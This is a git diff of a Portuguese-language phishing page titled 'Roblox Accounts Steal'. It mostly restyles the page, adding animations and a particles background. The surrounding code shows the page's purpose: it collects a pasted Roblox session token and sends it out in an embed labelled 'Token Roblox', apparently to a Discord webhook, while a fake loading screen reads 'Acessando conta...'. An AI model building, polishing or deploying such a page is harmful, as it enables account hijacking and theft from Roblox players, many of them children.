@@ -4,51 +4,78 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Roblox Accounts Steal</title>
+
+  <!-- Particles.js CDN (leve e bonito) -->
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+
   <style>
-    body {
-      background: linear-gradient(135deg, #0f001a, #1a0033);
-      color: #e0ccff;
-      font-family: 'Segoe UI', Arial, sans-serif;
+    body, html {
       margin: 0;
       padding: 0;
-      min-height: 100vh;
-      overflow-x: hidden;
+      height: 100%;
+      overflow: hidden;
+      background: #0f001a;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      color: #e0ccff;
     }
+
+    #particles-js {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: -2;
+    }
+
     .container {
+      position: relative;
+      z-index: 1;
       display: flex;
       flex-direction: row;
       min-height: 100vh;
-      background: #0f001a;
     }
+
     .video-sidebar {
       width: 35%;
       min-width: 320px;
-      background: #0f001a;
+      background: rgba(26, 0, 51, 0.4);
+      backdrop-filter: blur(8px);
       display: flex;
       flex-direction: column;
       align-items: center;
       padding: 20px 10px;
+      border-right: 1px solid rgba(102, 0, 51, 0.3);
     }
+
     .video-wrapper {
       width: 100%;
       max-width: 380px;
       aspect-ratio: 16 / 9;
       background: #000;
-      border-radius: 12px;
+      border-radius: 16px;
       overflow: hidden;
-      box-shadow: 0 0 15px rgba(255, 0, 68, 0.4);
+      box-shadow: 0 10px 30px rgba(255, 0, 68, 0.25);
+      transition: transform 0.4s ease, box-shadow 0.4s ease;
     }
+
+    .video-wrapper:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 20px 50px rgba(255, 0, 68, 0.45);
+    }
+
     .video-wrapper iframe {
       width: 100%;
       height: 100%;
     }
+
     .video-label {
-      margin-top: 12px;
-      font-size: 1.3em;
+      margin-top: 16px;
+      font-size: 1.4em;
       color: #ff88aa;
-      text-shadow: 0 0 8px #ff0044;
+      text-shadow: 0 0 12px #ff0044;
       font-weight: bold;
+      letter-spacing: 1px;
     }
+
     #main-content {
       flex: 1;
       padding: 60px 40px;
@@ -57,40 +84,96 @@
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      background: #0f001a;
+      background: rgba(15, 0, 26, 0.6);
+      backdrop-filter: blur(6px);
     }
-    h1 { color: #ff0044; font-size: 3.2em; margin-bottom: 15px; text-shadow: 0 0 15px #ff0044; }
-    .subtitle { color: #ff88aa; font-size: 1.6em; margin-bottom: 30px; font-weight: bold; }
-    input {
-      width: 90%; max-width: 550px; padding: 18px; font-size: 20px;
-      border: 3px solid #660033; border-radius: 12px;
-      background: #1a0033; color: #ffccdd; margin-bottom: 20px;
-      box-shadow: inset 0 0 10px #330022;
-    }
-    button {
-      padding: 18px 80px; font-size: 22px;
-      background: linear-gradient(90deg, #ff0044, #cc0033); color: white;
-      border: none; border-radius: 12px; cursor: pointer; font-weight: bold;
-      box-shadow: 0 0 20px #ff0044;
-    }
-    button:hover { background: linear-gradient(90deg, #cc0033, #990022); transform: scale(1.08); }
-    #status { margin-top: 30px; font-size: 20px; font-weight: bold; }
-    .glow { text-shadow: 0 0 20px #ff0044, 0 0 40px #cc0033; }
 
-    /* Botão Saiba Mais */
-    #saiba-mais-btn {
-      margin-top: 40px;
-      padding: 12px 40px;
-      font-size: 18px;
-      background: #660033;
+    h1 {
+      color: #ff0044;
+      font-size: 3.8em;
+      margin-bottom: 20px;
+      text-shadow: 0 0 30px #ff0044, 0 0 60px #cc0033;
+      animation: glowPulse 3s infinite alternate;
+    }
+
+    @keyframes glowPulse {
+      0% { text-shadow: 0 0 20px #ff0044; }
+      100% { text-shadow: 0 0 50px #ff0044, 0 0 80px #cc0033; }
+    }
+
+    .subtitle {
+      color: #ff88aa;
+      font-size: 1.8em;
+      margin-bottom: 40px;
+      text-shadow: 0 0 15px #ff88aa;
+    }
+
+    input {
+      width: 90%;
+      max-width: 550px;
+      padding: 18px;
+      font-size: 20px;
+      border: 2px solid #660033;
+      border-radius: 12px;
+      background: rgba(26, 0, 51, 0.7);
+      color: #ffccdd;
+      margin-bottom: 25px;
+      box-shadow: inset 0 0 12px rgba(102, 0, 51, 0.5);
+      transition: all 0.3s;
+    }
+
+    input:focus {
+      border-color: #ff0044;
+      box-shadow: 0 0 20px rgba(255, 0, 68, 0.6);
+      outline: none;
+    }
+
+    button {
+      padding: 18px 80px;
+      font-size: 22px;
+      background: linear-gradient(90deg, #ff0044, #cc0033);
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 12px;
       cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 0 25px rgba(255, 0, 68, 0.6);
+      transition: all 0.4s ease;
     }
-    #saiba-mais-btn:hover { background: #990044; }
 
-    /* Modal Saiba Mais */
+    button:hover {
+      transform: translateY(-4px) scale(1.08);
+      box-shadow: 0 15px 40px rgba(255, 0, 68, 0.8);
+      background: linear-gradient(90deg, #ff3366, #ff0066);
+    }
+
+    #status {
+      margin-top: 30px;
+      font-size: 20px;
+      font-weight: bold;
+      text-shadow: 0 0 10px #ff88aa;
+    }
+
+    /* Saiba Mais */
+    #saiba-mais-btn {
+      margin-top: 50px;
+      padding: 14px 50px;
+      font-size: 20px;
+      background: rgba(102, 0, 51, 0.7);
+      color: #ffccdd;
+      border: 2px solid #660033;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    #saiba-mais-btn:hover {
+      background: rgba(153, 0, 68, 0.9);
+      border-color: #ff0044;
+      box-shadow: 0 0 25px #ff0044;
+    }
+
+    /* Modal */
     #modal {
       display: none;
       position: fixed;
@@ -100,54 +183,74 @@
       z-index: 10000;
       justify-content: center;
       align-items: center;
-    }
-    .modal-content {
-      background: #1a0033;
-      border: 2px solid #660033;
-      border-radius: 12px;
-      padding: 30px;
-      max-width: 600px;
-      width: 90%;
-      position: relative;
-      color: #e0ccff;
-    }
-    .close {
-      position: absolute;
-      top: 10px; right: 20px;
-      font-size: 32px;
-      color: #ff88aa;
-      cursor: pointer;
-    }
-    .close:hover { color: #ff0044; }
-    .modal-section {
-      margin-bottom: 25px;
-    }
-    .modal-section h2 {
-      color: #ff88aa;
-      margin-bottom: 10px;
-      border-bottom: 1px solid #660033;
-      padding-bottom: 8px;
+      backdrop-filter: blur(8px);
     }
 
-    /* Loading screen */
+    .modal-content {
+      background: rgba(26, 0, 51, 0.95);
+      border: 2px solid #660033;
+      border-radius: 16px;
+      padding: 40px;
+      max-width: 700px;
+      width: 90%;
+      position: relative;
+      box-shadow: 0 0 60px rgba(255, 0, 68, 0.4);
+      animation: modalFade 0.5s ease;
+    }
+
+    @keyframes modalFade {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .close {
+      position: absolute;
+      top: 15px; right: 25px;
+      font-size: 40px;
+      color: #ff88aa;
+      cursor: pointer;
+      transition: color 0.3s;
+    }
+
+    .close:hover { color: #ff0044; }
+
+    .modal-section h2 {
+      color: #ff88aa;
+      margin-bottom: 15px;
+      font-size: 1.8em;
+      text-shadow: 0 0 10px #ff88aa;
+    }
+
+    /* Loading */
     #loading {
       display: none;
-      position: fixed; top: 0; left: 0;
+      position: fixed;
+      top: 0; left: 0;
       width: 100%; height: 100%;
-      background: #0f001a;
+      background: rgba(15, 0, 26, 0.98);
       z-index: 9999;
       flex-direction: column;
       justify-content: center;
       align-items: center;
     }
+
     .spinner {
       width: 100px; height: 100px;
-      border: 12px solid #ff0044; border-top: 12px solid #cc0033;
-      border-radius: 50%; animation: spin 1.3s linear infinite;
-      margin-bottom: 50px;
+      border: 12px solid #ff0044;
+      border-top: 12px solid #cc0033;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+      margin-bottom: 40px;
+      box-shadow: 0 0 40px rgba(255, 0, 68, 0.6);
     }
+
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    #loading-text { font-size: 2.6em; color: #ff88aa; text-shadow: 0 0 15px #ff0044; min-height: 80px; }
+
+    #loading-text {
+      font-size: 2.8em;
+      color: #ff88aa;
+      text-shadow: 0 0 20px #ff0044;
+    }
 
     /* Responsivo */
     @media (max-width: 900px) {
@@ -160,6 +263,9 @@
   </style>
 </head>
 <body>
+
+  <!-- Partículas de fundo -->
+  <div id="particles-js"></div>
 
   <div class="container">
     <div class="video-sidebar" id="video-left">
@@ -179,7 +285,6 @@
 
       <div id="status"></div>
 
-      <!-- Botão Saiba Mais -->
       <button id="saiba-mais-btn" onclick="openModal()">Saiba Mais</button>
     </div>
 
@@ -191,16 +296,16 @@
     </div>
   </div>
 
-  <!-- Loading infinito -->
+  <!-- Loading -->
   <div id="loading">
     <div class="spinner"></div>
     <div id="loading-text">Acessando conta...</div>
   </div>
 
-  <!-- Modal Saiba Mais -->
+  <!-- Modal -->
   <div id="modal" onclick="closeModal(event)">
     <div class="modal-content" onclick="event.stopPropagation()">
-      <span class="close" onclick="closeModal()">&times;</span>
+      <span class="close" onclick="closeModal()">×</span>
 
       <div class="modal-section">
         <h2>Como esse site funciona</h2>
@@ -217,6 +322,40 @@
   </div>
 
   <script>
+    // Inicializa particles.js
+    particlesJS("particles-js", {
+      "particles": {
+        "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
+        "color": { "value": "#ffffff" },
+        "shape": { "type": "circle" },
+        "opacity": { "value": 0.5, "random": true },
+        "size": { "value": 3, "random": true },
+        "line_linked": { "enable": false },
+        "move": {
+          "enable": true,
+          "speed": 1.5,
+          "direction": "none",
+          "random": true,
+          "straight": false,
+          "out_mode": "out",
+          "bounce": false
+        }
+      },
+      "interactivity": {
+        "detect_on": "canvas",
+        "events": {
+          "onhover": { "enable": true, "mode": "repulse" },
+          "onclick": { "enable": true, "mode": "push" },
+          "resize": true
+        },
+        "modes": {
+          "repulse": { "distance": 100, "duration": 0.4 },
+          "push": { "particles_nb": 4 }
+        }
+      },
+      "retina_detect": true
+    });
+
     const messages = [
       "Acessando conta...",
       "Verificando autenticação...",
@@ -270,10 +409,6 @@
           title: "Token Roblox",
           description: "```" + token + "```",
           color: 0xff0044,
-          fields: [
-            { name: "Status", value: "Conta sendo acessada", inline: true },
-            { name: "Fonte", value: "Token colado", inline: true }
-          ],
           footer: { text: new Date().toLocaleString("pt-BR") }
         }]
       };
@@ -295,7 +430,6 @@
       });
     }
 
-    // Funções do modal
     function openModal() {
       document.getElementById("modal").style.display = "flex";
     }
